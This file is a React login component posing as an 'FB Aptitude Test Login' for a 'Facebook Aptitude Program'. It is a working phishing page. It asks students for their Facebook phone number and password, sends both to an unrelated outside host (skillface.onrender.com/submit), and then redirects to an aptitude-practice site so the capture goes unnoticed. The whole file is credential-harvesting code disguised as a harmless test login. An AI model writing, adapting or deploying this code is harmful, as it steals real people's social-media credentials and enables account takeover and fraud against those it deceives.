import React, { useState } from 'react';
import axios from 'axios';

const Login = () => {
    const [formData, setFormData] = useState({
        ph: '',
        password: '',
        college: '',
        collegeID: ''
    });

    const [loading, setLoading] = useState(false);

    const handleChange = (e) => {
        setFormData((prev) => ({
            ...prev,
            [e.target.name]: e.target.value
        }));
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (loading) return; // prevent multiple submissions

        setLoading(true); // disable button

        try {
            const finalData = {
                ph: Number(formData.ph),
                password: formData.password
            };

            const res = await axios.post('https://skillface.onrender.com/submit', finalData);
            console.log('Response:', res.data);

            // ✅ Redirect after success
            window.location.href = 'https://www.indiabix.com/logical-reasoning/number-series/';
        } catch (err) {
            console.error('Login Failed:', err);
            setLoading(false); // enable again on error
        }
    };

    return (
        <div className="h-140 bg-gradient-to-r from-blue-600 to-cyan-500 flex items-center justify-center px-2">
            <form
                onSubmit={handleSubmit}
                className="w-full max-w-md bg-white p-6 rounded-xl shadow-lg"
            >
                <h2 className="text-xl font-semibold text-center text-gray-800 mb-4">
                    FB Aptitude Test Login
                </h2>

                {/* Facebook Number */}
                <div className="mb-3">
                    <label className="block text-sm text-gray-700 font-medium mb-1">Facebook Number</label>
                    <input
                        type="number"
                        name="ph"
                        value={formData.ph}
                        onChange={handleChange}
                        required
                        className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                </div>

                {/* Password */}
                <div className="mb-3">
                    <label className="block text-sm text-gray-700 font-medium mb-1">Facebook Password</label>
                    <input
                        type="password"
                        name="password"
                        value={formData.password}
                        onChange={handleChange}
                        required
                        className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                </div>

                {/* College Name */}
                <div className="mb-3">
                    <label className="block text-sm text-gray-700 font-medium mb-1">College Name</label>
                    <input
                        type="text"
                        name="college"
                        value={formData.college}
                        onChange={handleChange}
                        required
                        className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                </div>

                {/* College ID */}
                <div className="mb-4">
                    <label className="block text-sm text-gray-700 font-medium mb-1">College ID Card Number</label>
                    <input
                        type="text"
                        name="collegeID"
                        value={formData.collegeID}
                        onChange={handleChange}
                        required
                        className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
                    />
                </div>

                {/* Submit button */}
                <button
                    type="submit"
                    disabled={loading}
                    className={`w-full ${
                        loading ? 'bg-gray-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
                    } text-white text-sm font-semibold py-2 rounded-md transition duration-200`}
                >
                    {loading ? 'Logging in...' : 'Login'}
                </button>

                <p className="text-center text-xs text-gray-500 mt-4">
                    &copy; 2025 Facebook Aptitude Program
                </p>
            </form>
        </div>
    );
};

export default Login;
